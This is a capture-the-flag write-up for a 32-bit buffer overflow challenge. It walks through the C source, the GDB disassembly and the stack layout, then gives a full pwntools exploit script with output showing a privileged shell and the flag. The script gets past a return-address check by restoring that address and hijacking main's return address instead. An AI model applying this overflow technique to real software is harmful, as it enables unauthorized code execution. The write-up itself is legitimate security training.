# Analysis
For this challenge, we were provided the source code and a binary. The goal is to use a buffer overflow to call the `get_a_shell()` functions.
I used python's `pwntools` library to create and send the payload. 

Since we have the source code, we can start by looking there. 

```c
int my_return_address = 0;
int new_return_address = 0;

int main() {
    receive_input();
}
```

The main function is pretty sparse, just calls `receive_input()`, so let's look at that next.

```c
void receive_input() {
    printf("I will store my return address to the global area first,\n"
            "and get the back the stored value to protect my stack!\n");

    asm volatile("mov 0x4(%%ebp), %0" :"=r"(my_return_address)::"memory");
    printf("my_return_address is %p\n", (void*)my_return_address);

    int a = 0x41414141, b = 0x42424242;
    char buf[20];

    printf("Values in two local variables are:\n"
            "a = 0x%08x and b = 0x%08x\n", a, b);

    printf("Can you change these values to:\n"
            "a = 0x48474645 and b = 0x44434241?\n");

    printf("Type YES if you agree with this... "
            "(a fake message, you may overflow the input buffer).\n");
    fgets(buf, 128, stdin);

    printf("Now the variables store:\n"
            "a = 0x%08x b = 0x%08x\n", a, b);

    if(a == 0x48474645 && b == 0x44434241) {
        printf("Great, but I will not execute get_a_shell() for you..\n");
        printf("Run it yourself!\n");
    }
    else {
        printf("Analyze the program!\n");
        exit(-1);
    }

    printf("Let's check the new return address\n");

    asm volatile("mov 0x4(%%ebp), %0" :"=r"(new_return_address)::"memory");

    printf("Previous ret addr %p, new ret addr %p\n",
        (void*)my_return_address, (void*)new_return_address);

    if(my_return_address != new_return_address) {
        printf("You have changed the return address, attack detected!\n");
        exit(-1);
    }
}
```
Two noteworthy things:
1. The buffer is only allocated 20 bytes, but `fgets` is taking in 128
2. The function checks to see if the return address is changed, and if it is it exits rather than returning

Changing the variables is fairly straightforward. A quick look at GDB confirms what gets pushed onto the stack.

```gdb
   0x08049250 <+0>:     push   %ebp
   0x08049251 <+1>:     mov    %esp,%ebp
   0x08049253 <+3>:     push   %ebx

...

   0x0804929b <+75>:    movl   $0x41414141,-0x8(%ebp)
   0x080492a2 <+82>:    movl   $0x42424242,-0xc(%ebp)

...

   0x080492e7 <+154>:   mov    -0x20(%ebp),%ecx

...

   0x080492fb <+171>:   mov    %ecx,(%esp)
   0x080492fe <+174>:   movl   $0x80,0x4(%esp)
   0x08049306 <+182>:   mov    %eax,0x8(%esp)
   0x0804930a <+186>:   call   0x8049060 <fgets@plt>
```

This means that the stack looks something like this:
```
[ebp +  0x4]    return address
[ebp]           previous ebp   
[ebp -  0x4]    ebx
[ebp -  0x8]    0x41414141 (AAAA)
[ebp -  0xc]    0x42424242 (BBBB)
[ebp - 0x10]
[ebp - 0x14]
[ebp - 0x18]
[ebp - 0x1c] 
[ebp - 0x20]    buffer
```

Now we can create our string to overflow the return address. 

```py
ri_str = b'a' * 20 + b'ABCDEFGH' + b'_EBX_EBP' + b'aaaa'
```

```
$ ./p.py
[+] Starting local process './bof-level4': pid 1056071
[*] Switching to interactive mode
[*] Process './bof-level4' stopped with exit code 255 (pid 1056071)
I will store my return address to the global area first,
and get the back the stored value to protect my stack!
my_return_address is 0x8049426
Values in two local variables are:
a = 0x41414141 and b = 0x42424242
Can you change these values to:
a = 0x48474645 and b = 0x44434241?
Type YES if you agree with this... (a fake message, you may overflow the input buffer).
Now the variables store:
a = 0x48474645 b = 0x44434241
Great, but I will not execute get_a_shell() for you..
Run it yourself!
Let's check the new return address
Previous ret addr 0x8049426, new ret addr 0x61616161
You have changed the return address, attack detected!
[*] Got EOF while reading in interactive
```

Because of the return address check, this doesn't work. However, the program lets us write a lot of bytes and `main()` doesn't appear to exit. 
That means we might be able to overwrite `receive_input`'s return address with its original address and use `main`'s return address to call `get_a_shell()` instead. 

Another look at gdb tells us what we need to know about main. 

```gdb
   0x08049410 <+0>:     push   %ebp
   0x08049411 <+1>:     mov    %esp,%ebp
   0x08049413 <+3>:     push   %ebx
   0x08049414 <+4>:     push   %eax
   0x08049415 <+5>:     call   0x804941a <main+10>
   0x0804941a <+10>:    pop    %ebx
   0x0804941b <+11>:    add    $0x2be6,%ebx
   0x08049421 <+17>:    call   0x8049250 <receive_input>
   0x08049426 <+22>:    xor    %eax,%eax
   0x08049428 <+24>:    add    $0x4,%esp
   0x0804942b <+27>:    pop    %ebx
   0x0804942c <+28>:    pop    %ebp
   0x0804942d <+29>:    ret
```

And again the stack:
```
[ebp + 0x4]    return address
[ebp]          prev. ebp
[ebp - 0x4]    ebx
[ebp - 0x8]    eax
````
Again, we use this to create the string that will overflow the return address, and we can modify the string from 
`receive_input()`. 

```py
ri_str = b'a' * 20 + b'ABCDEFGH' + b'_EBX_EBP' + p32(original_return_addr)
main_str = b'_EAX_EBX_EBP' + p32(get_a_shell_addr)
```

Getting the original return address is simple, as the program prints it out. Getting `get_a_shell`'s address is
as simple as looking it up in gdb. 

```gdb
pwndbg> info functions
All defined functions:

Non-debugging symbols:
...
0x080491d0  get_a_shell
0x08049250  receive_input
0x08049410  main
...
```

# Full Script + Solve
```py
#!/usr/bin/python3

from pwn import *

p = process("./bof-level4")
orig_ret = 0x8049426
gas_addr = 0x80491d0

ri_str = b'a' * 20 + b'ABCDEFGH' + b'_EBX_EBP' + p32(orig_ret)
main_str = b'_EAX_EBX_EBP' + p32(gas_addr)

p.sendline(ri_str + main_str)

p.interactive()
```
```
$ ./p.py
[+] Starting local process './bof-level4': pid 1056856
[*] Switching to interactive mode
I will store my return address to the global area first,
and get the back the stored value to protect my stack!
my_return_address is 0x8049426
Values in two local variables are:
a = 0x41414141 and b = 0x42424242
Can you change these values to:
a = 0x48474645 and b = 0x44434241?
Type YES if you agree with this... (a fake message, you may overflow the input buffer).
Now the variables store:
a = 0x48474645 b = 0x44434241
Great, but I will not execute get_a_shell() for you..
Run it yourself!
Let's check the new return address
Previous ret addr 0x8049426, new ret addr 0x8049426
Spawning a privileged shell

$ cat flag
cand{S1mpl3_c0pY_c4nT_pR0t3cT_retaddr}
```

